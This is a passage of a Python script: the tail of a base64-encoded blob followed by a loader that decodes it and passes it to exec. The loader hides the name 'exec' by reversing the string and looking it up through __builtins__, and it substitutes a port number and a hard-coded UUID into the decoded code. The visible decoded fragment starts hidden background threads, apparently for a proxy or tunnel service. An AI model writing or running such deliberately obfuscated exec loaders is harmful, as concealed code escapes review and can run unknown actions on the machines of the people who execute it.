WFkaW5nLlRocmVhZCh0YXJnZXQ9X3Nfc19yLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQppZiAiY2YiIGluIHlzeS5hcmd2IG9yIF9lX2NfZjoKICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PV9yX2NfZiwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9X3JfeF95LCBkYWVtb249VHJ1ZSkuc3RhcnQoKQp3aGlsZSBUcnVlOiB0aW1lLnNsZWVwKDEpCmV4aXQoMCkK"""
from base64 import b64decode as de

if __name__ == "__main__":
    getattr(__builtins__, "cexe"[::-1])(
        de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
        .replace("fc_", "True")
        .replace("iu_", "07a1f20f-33ce-42f9-8ca3-e61b6ec7fbef")
        .replace("lv_", "")
        .replace("mv_", "")
        .replace("rt_", ""))
